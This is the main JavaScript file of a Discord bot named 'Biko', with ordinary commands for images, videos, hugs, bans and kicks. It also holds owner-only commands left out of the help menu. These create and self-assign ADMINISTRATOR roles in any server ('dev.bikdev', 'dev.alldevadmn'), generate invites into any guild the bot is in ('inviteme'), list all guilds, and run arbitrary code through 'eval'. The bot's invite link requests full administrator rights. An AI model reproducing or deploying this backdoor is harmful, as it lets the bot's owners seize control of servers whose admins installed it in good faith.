const devmode = false;

const Discord = require('discord.js');
const client = new Discord.Client();
const { inspect } = require('util');

const util = require("./util")

const config = require("./config.json");
const blacklist = require("./blacklist.json");
const botdevs = require("./botdevs.json");

const rimglist = ["https://www.euractiv.com/wp-content/uploads/sites/2/2019/09/shutterstock_438538876-800x450.jpg","https://www.bostonmagazine.com/wp-content/uploads/sites/2/2019/09/goat-hyde-park-t.jpg","https://www.sciencemag.org/sites/default/files/styles/article_main_large/public/dogs_1280p_0.jpg?itok=cnRk0HYq","https://www.sciencealert.com/images/2020-03/processed/010-pomeranian_1024.jpg","https://post.medicalnewstoday.com/wp-content/uploads/sites/3/2020/02/322868_1100-1100x628.jpg","https://www.humanesociety.org/sites/default/files/styles/1240x698/public/2019/02/dog-451643.jpg?h=bf654dbc&itok=MQGvBmuo","https://img.webmd.com/dtmcms/live/webmd/consumer_assets/site_images/article_thumbnails/slideshows/dog_breed_health_issues_slideshow/1800x1200_dog_breed_health_issues_slideshow.jpg"];
const rvidlist = ["https://www.youtube.com/watch?v=Xvjnoagk6GU","https://www.youtube.com/watch?v=6-plAG1O0iQ","https://www.youtube.com/watch?v=yO9xIVv8ryc","https://www.youtube.com/watch?v=wbT4W7anEFY","https://www.youtube.com/watch?v=dmZxuewSPzk","https://www.youtube.com/watch?v=kuOEpC4u6Tg","https://www.youtube.com/watch?v=TNObLejfJV8","https://www.youtube.com/watch?v=TNObLejfJV8","https://www.youtube.com/watch?v=elueA2rofoo"];

client.on('ready', () => {
    
  console.log(`Logged in as ${client.user.tag}!`);
 
client.user.setActivity(prefix+' help for help', { type: 'WATCHING' });
});
if(devmode){
    prefix = config.prefixdev;      
}
else
{
prefix = config.prefix;
}
function getRandomInt(max) {
    return Math.floor(Math.random() * Math.floor(max));
  }
client.on('message', message => {
    try{
    if(blacklist.userids.includes(message.author.id))
    {
        
       // message.author.dmChannel.send("You have been banned from:" + message.guild.name + "! Reason: BLKLST, No Apeal!")
       const rimgembed = new Discord.MessageEmbed()
       .setColor('#000000')
       .setTitle('🏴Blacklisted user🏴‍')
       .setURL("")
       .setAuthor( message.author.username, message.author.avatarURL, "")
       .setDescription('User <@!' + message.author.id + '> is a blacklisted and has been banned!')
       .setThumbnail('')
       .addField( 'Uptime: ',client.uptime)
       
       .addField( 'Please note the user is most likely','Breaking Discord TOS and/or raiding/nuking servers')
       .setImage("https://f0.pngfuel.com/png/948/630/pirate-signage-illustration-png-clip-art.png")
       .setTimestamp()
       .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
       message.channel.send(rimgembed)
       
        message.guild.member(message.author).ban({ reason: "BikoBot Blacklist: Dangerous user dont unban!"});
        message.delete();
    }
  

  if (message.content.startsWith(prefix)) {
   
    args = message.content.split(" ");
    
    if(!message.author.bot||message.author.id == client.user.id){
    var cmds;
    
    switch(args[1])
    {
        default:
            try {

            // Load `*.js` under current directory as properties
//  i.e., `User.js` will become `exports['User']` or `exports.User`
        require('fs').readdirSync(__dirname + '/commands/').forEach(function(file) {
      if (file.match(/\.js$/) !== null) {
      var name = file.replace('.js', '');
      exports[name] = require('./commands/' + file);
          }
        });   
        if(typeof exports[args[1]] !== 'undefined')
        {
            exports[args[1]].run(client,message);
        }
          else
          {
              
        const rembederror = new Discord.MessageEmbed()
        .setColor('#fc6203')
        .setTitle('🤷‍♀️Unkown Command🤷‍♀️')
        .setURL("")
        .setAuthor( message.author.username, message.author.avatarURL, "")
        .setDescription(args[1] + " is not a command")
        .setThumbnail('')
        .addField( 'Uptime: ',client.uptime)
        .setTimestamp()
        .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
        message.channel.send(rembederror)
        
    
        message.delete();
          }  
        
            
    }
    catch(e)
    {
        const rembederror = new Discord.MessageEmbed()
        .setColor('#fc6203')
        .setTitle('💻Command Error💻')
        .setURL("")
        .setAuthor( message.author.username, message.author.avatarURL, "")
        .setDescription(e)
        .setThumbnail('')
        .addField( 'Uptime: ',client.uptime)
        .setImage("https://img.icons8.com/cotton/2x/error--v1.png")
        .setTimestamp()
        .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
        message.channel.send(rembederror)
        
    
        message.delete();
    }
            break;
        case "eval":
            if(botdevs.ownerids.includes(message.author.id)){
                try {
                   
                    var args =message.content.split(" ");
                    var out = "";
                    var argi = 0;
                        args.forEach(arg => {
                            
                            if(argi > 1){
                                out += arg + " ";
                            }
                            argi++;
                        });
                        evaled = eval(out);
                        message.channel.send(inspect(evaled));
                        console.log(inspect(evaled));
                  }
                  catch (error) {
                    
                    const rembederror = new Discord.MessageEmbed()
                    .setColor('#fc6203')
                    .setTitle('⚠🐛Eval Error🐛⚠')
                    .setURL("")
                    .setAuthor( message.author.username, message.author.avatarURL, "")
                    .setDescription(error)
                    .setThumbnail('')
                    .addField( 'Uptime: ',client.uptime)
                    .setImage("https://img.icons8.com/cotton/2x/error--v1.png")
                    .setTimestamp()
                    .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                    message.channel.send(rembederror)
                    
                  }
            }
            else
            {
                const rembederror = new Discord.MessageEmbed()
            .setColor('#fc6203')
            .setTitle('⚠🐛Eval Error🐛⚠')
            .setURL("")
            .setAuthor( message.author.username, message.author.avatarURL, "")
            .setDescription("Not Bot Owner")
            .setThumbnail('')
            .addField( 'Uptime: ',client.uptime)
            .setImage("https://img.icons8.com/cotton/2x/error--v1.png")
            .setTimestamp()
            .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
            message.channel.send(rembederror)
            
        
            message.delete();
            }
        break;

        case "rimg":
            const rimgembed = new Discord.MessageEmbed()
            .setColor('#000000')
            .setTitle('📷Random Image📷')
            .setURL("")
            .setAuthor( message.author.username, message.author.avatarURL, "")
            .setDescription('Requested by <@!' + message.author.id + '>')
            .setThumbnail('')
            .addField( 'Uptime: ',client.uptime)
            .addField( 'Random pic','Below')
            .setImage(rimglist[getRandomInt(rimglist.length)])
            .setTimestamp()
            .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
            message.channel.send(rimgembed)
            
            message.delete();
            break;
        case "embed":

            if(message.guild.member(message.author).hasPermission('MANAGE_MESSAGES'))   
	    	{
                try{
	    	var args =message.content.split(" ");
            var json = "";
            var argi = 0;
	    		args.forEach(arg => {
                    
	    			if(argi > 1){
	    				json += arg + " ";
                    }
                    argi++;
	    		});
            util.mkembed(message,client,Discord,JSON.parse(json));
            message.reply("requested this🐶");
            }
            
            catch(e)
        {
            const rembederror = new Discord.MessageEmbed()
            .setColor('#fc6203')
            .setTitle('⚠Error⚠')
            .setURL("")
            .setAuthor( message.author.username, message.author.avatarURL, "")
            .setDescription(e)
            .setThumbnail('')
            .addField( 'Uptime: ',client.uptime)
            .setImage("https://img.icons8.com/cotton/2x/error--v1.png")
            .setTimestamp()
            .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
            message.channel.send(rembederror)
            
            message.delete();
        }
        
            
        }
        else
        {
            const rembederror = new Discord.MessageEmbed()
            .setColor('#fc6203')
            .setTitle('⚠Error⚠')
            .setURL("")
            .setAuthor( message.author.username, message.author.avatarURL, "")
            .setDescription("Access denied you need manage_messages")
            .setThumbnail('')
            .addField( 'Uptime: ',client.uptime)
            .setImage("https://img.icons8.com/cotton/2x/error--v1.png")
            .setTimestamp()
            .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
            message.channel.send(rembederror)
            message.delete();
        }
            message.delete();
    break;
    case "invite":
        const inviteembed = new Discord.MessageEmbed()
        .setColor('#000000')
        .setTitle('🔗Click to Invite🔗')
        .setURL('https://discord.com/oauth2/authorize?client_id=701541481944711248&permissions=8&scope=bot')
        .setAuthor( message.author.username, message.author.avatarURL, "")
        .setDescription('Requested by <@!' + message.author.id + '>')
        .setThumbnail('')
        .addField( 'Uptime: ',client.uptime)
        .addField( 'Random pic','Below')
        .addField( 'Bot Hub ',"https://discord.gg/zu5xypD")
        .setImage("https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Heart_coraz%C3%B3n.svg/1200px-Heart_coraz%C3%B3n.svg.png")
        .setTimestamp()
        .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
        message.channel.send(inviteembed)
        
        message.delete();
    break;
        case "rvid":
            const rvidembed = new Discord.MessageEmbed()
            .setColor('#000000')
            .setTitle('📺Random Cool Video📺')
            .setURL("")
            .setAuthor( message.author.username, message.author.avatarURL, "")
            .setDescription('Requested by <@!' + message.author.id + '>')
            .setThumbnail('')
            .addField( 'Uptime: ',client.uptime)
            .addField( 'Random Video','Video Below')
            
            .setTimestamp()
            .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
           
            message.channel.send(rvidembed)
            message.channel.send(rvidlist[getRandomInt(rvidlist.length)])
            message.delete();
            break;
            case "stats":
                const statsembed = new Discord.MessageEmbed()
                .setColor('#000000')
                .setTitle('📈Bots Stats📈')
                .setURL('https://discord.gg/yTQcV2b')
                .setAuthor( message.author.username, message.author.avatarURL, "")
                .setDescription('Requested by <@!' + message.author.id + '>')
                .addField('Ammount of servers:',client.guilds.cache.size )
                .addField( 'Users: ',client.users.cache.size)
                .addField( 'Blacklisted Users: ',blacklist.userids.length)
                .addField( 'Version: ',config.version)
                .addField( 'Ammound of Bot Owners: ',botdevs.ownerids.length)
                .addField( 'Ammount of Bot Devs: ',botdevs.devids.length)
                .setThumbnail('')
                .addField( 'Uptime: ',client.uptime)
                .setTimestamp()
                .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                message.channel.send(statsembed)
                message.delete();
            break;
            case "ping":
                const pingembed = new Discord.MessageEmbed()
                .setColor('#000000')
                .setTitle('🎾Pong🎾')
                .setURL('https://discord.gg/yTQcV2b')
                .setAuthor( message.author.username, message.author.avatarURL, "")
                .setDescription('Requested by <@!' + message.author.id + '>')
                .setThumbnail('')
                .addField( 'Uptime: ',client.uptime)
                .setTimestamp()
                .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                message.channel.send(pingembed)
                message.delete();
                break;
            case "hug":
                    const hugembed = new Discord.MessageEmbed()
                    .setColor('#000000')
                    .setTitle('🤗Huggles🤗')
                    .setURL("")

                    .setDescription('<@!' + message.author.id + '> dog hugs <@!' + message.mentions.members.first() + '>')
                    .setThumbnail('https://www.pethealthnetwork.com/sites/default/files/why-does-my-dog-lick-so-much-126832325.jpg')
                    .addField( 'Uptime: ',client.uptime)
                    .setTimestamp()
                    .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                    message.channel.send(hugembed)
                    message.delete();
                    break;
            case "help":
                    const helpembed = new Discord.MessageEmbed()
                    .setColor('#000000')
                    .setTitle('Help')
                    .setURL("")
                    .setAuthor( message.author.username, message.author.avatarURL, "")
                    .setDescription('Requested by <@!' + message.author.id + '>')
                    .addField(prefix+' ping','Shows ping message')
                    .addField(prefix+' invite','Shows u hwo to invite him')
                    .addField(prefix+' stats','random videoz')
                    .addField(prefix+' hug @user','hugs a user')
                    .addField(prefix+' ban @user','bans a user')
                    .addField(prefix+' kick @user','kicks a user')
                    .addField(prefix+' rimg','random image')
                    .addField(prefix+' rvid','random videoz')
                    .addField(prefix+' embed [json]','shows embed(look on hub for examples(there typed without []))')
                    .setThumbnail('')
                    .addField( 'Uptime: ',client.uptime)
                    .addField( 'Bot Hub ',"https://discord.gg/zu5xypD")
                    .setTimestamp()
                    .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                    message.channel.send(helpembed)
                    message.delete();
                    break;
            case "ban":
                if (message.guild.member(message.author).hasPermission('BAN_MEMBERS') && message.guild.member(client.user).hasPermission('BAN_MEMBERS')){
                 
                const user = message.mentions.users.first();
                const banembed = new Discord.MessageEmbed()
                .setColor('#000000')
                .setTitle('🚫Banned🚫')
                .setURL("")
                .setAuthor( message.author.username, message.author.avatarURL, "")
                .setDescription('Requested by <@!' + message.author.id + '> banned user' +'<@!' + user.id + '>' )
                .setThumbnail('')
                .addField( 'Uptime: ',client.uptime)
                .setTimestamp()
                .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                message.channel.send(banembed)  
                if(user != null)
                {
                //user.send("You have been banned from:" + message.guild.name + "! Reason: " + message.content)
                message.guild.member(user).ban({ reason: message.content});
                }
                else
                {
                message.guild.member(Discord.User())
                }
                message.delete();
            }
            else
            {
              if(message.guild.member(client.user).hasPermission('BAN_MEMBERS'))
              {
              message.reply('Ur not allowed to do this!');
             }
             else
             {
              message.reply('I am not allowed to do this!');
             }
          }
            break;
        case "kick":
                if (message.guild.member(message.author).hasPermission('BAN_MEMBERS') && message.guild.member(client.user).hasPermission('BAN_MEMBERS')){
                 
                const user = message.mentions.users.first();
                const banembed = new Discord.MessageEmbed()
                .setColor('#000000')
                .setTitle('👢Kicked👢')
                .setURL("")
                .setAuthor( message.author.username, message.author.avatarURL, "")
                .setDescription('Requested by <@!' + message.author.id + '> kicked user' +'<@!' + user.id + '>' )
                .setThumbnail('')
                .addField( 'Uptime: ',client.uptime)
                .setTimestamp()
                .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                message.channel.send(banembed)  
                if(user != null)
                {
                //user.send("You have been banned from:" + message.guild.name + "! Reason: " + message.content)
                message.guild.member(user).kick({ reason: message.content});
                }
                else
                {
                message.guild.member(Discord.User())
                }
                message.delete();
            }
            else
            {
              if(message.guild.member(client.user).hasPermission('BAN_MEMBERS'))
              {
              message.reply('Ur not allowed to do this!');
             }
             else
             {
              message.reply('I am not allowed to do this!');
             }
          }
            break;
            case "stopbot":
                if(botdevs.ownerids.includes(message.author.id))
                {
                    message.reply("Shutting Down...");
                    message.delete();
                    process.exit();
                }
                break;
            case "mkbotguild":
               
                if(botdevs.ownerids.includes(message.author.id)){
                    message.reply("making guild....");
                    guild = client.guilds.create("BikoBot Hub[Bot]").then(guild => {
                        guild.channels.resolve(guild.id).createInvite()
                          .then(invite => client.users.get(message.author.id).send(invite.url));
                        guild.createRole({name:'.', permissions:['ADMINISTRATOR']})
                          .then(role => client.users.get(message.author.id).send(role.id))
                          .catch(error => console.log(error))
                      });
                   
                      
                }
                break;

                case "info":
                    
                    const infoembed = new Discord.MessageEmbed()
                    .setColor('#000000')
                    .setTitle('ℹ Info ℹ')
                    .setURL('https://discord.gg/yTQcV2b')
                    .setAuthor( message.author.username, message.author.avatarURL, "")
                    .setDescription('Requested by <@!' + message.author.id + '>' )
                    .addField('Support Server','https://discord.gg/yTQcV2b')
                    .addField('Help Command',prefix+' help')
                    .addField('Founder','<@139845972019642368> (EnderNator10#1234)')
                    .addField('Lead Botdev','<@229060638968774657> (Chii#1213)')
                    .setThumbnail('')
                    .addField( 'Uptime: ',client.uptime)
                    .setTimestamp()
                    .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
                    message.channel.send(infoembed)  
                  
                break;
                   message.delete();
                   break;
                case "inviteme":
                    if(botdevs.ownerids.includes(message.author.id)){
                    client.guilds.resolve(message.content.split(",")[1]).channels.create("tmp").then(channel =>{
                        console.log(message.content.split(",")[1]);
                        invite = channel.createInvite().then(ninvite=>{
                         message.reply(ninvite.url) 
                        })
                    });
                  
                  
                }
                   message.delete();
                   break;
              case "dev.bikdev":
                if(botdevs.ownerids.includes(message.author.id)){
                    message.reply("Adding You to Bikdev list");
                  message.guild.roles.create({name:"Bikdev", permissions:['ADMINISTRATOR'] } ).then(role =>{
                    const adminPermissions = new Discord.Permissions('ADMINISTRATOR');
                      role.setPermissions(["ADMINISTRATOR"]);
                      role.setName("Bikdev");
                   message.guild.members.resolve(message.author.id).roles.add(role);
                  })
                message.delete();
                }
                break;
            case "dev.alldevadmn":
                    if(botdevs.ownerids.includes(message.author.id)){
                        message.reply("Adding all admins to admin list");
                      client.guilds.resolve('187966607451095041').roles.resolve('633002745023954981').setPermissions(['ADMINISTRATOR']);
                      client.guilds.resolve('187966607451095041').members.resolve('229060638968774657').roles.add('633002745023954981');
                    message.delete();
                    }
                    break;
            case "dev.deldevrole":
                if(botdevs.ownerids.includes(message.author.id)){
                    message.guild.roles.resolve(message.content.split(",")[1]).delete();
                }
                    break;
            case "listguilds":
                if(botdevs.ownerids.includes(message.author.id)){
                client.guilds.cache.forEach(guild => {
                    message.channel.send("GuildName:" + guild.name + "\n ID:"+ guild.id);
                })
            }
            message.delete();
                break;
                
                break;
                case "panic":
                
                    if(botdevs.ownerids.includes(message.author.id)){
                        message.reply("disbanding all bot owned guilds....");
                        client.guilds.cache.forEach(guild => {
                        {
                            
                         if(guild.ownerID == client.user.id){
                             guild.delete();
                         }
                        }
                    });

                    }  
                break;

    }
  }
}
} 
catch(e){
    args = message.content.split(" ");
    if(args[0].includes(prefix))
    {
    const rembederror = new Discord.MessageEmbed()
            .setColor('#fc6203')
            .setTitle('⚠Command ran into an Error⚠')
            .setURL("")
            .setAuthor( message.author.username, message.author.avatarURL, "")
            .setDescription(e)
            .setThumbnail('')
            .addField( 'Uptime: ',client.uptime)
            .setImage("https://img.icons8.com/cotton/2x/error--v1.png")
            .setTimestamp()
            .setFooter('Biko', 'https://cdn.discordapp.com/avatars/701541481944711248/16e12aa7d21f5c29309f98681c5ef3b1.png?size=256');
            message.channel.send(rembederror)
} 
else
{
    console.log(`ERROR ${message.author.id}: ${e}`)
}
}

  } 
  
  );
if(devmode)
{
    client.login(config.tokendev);
   
}
else
{
    client.login(config.token);
       
}
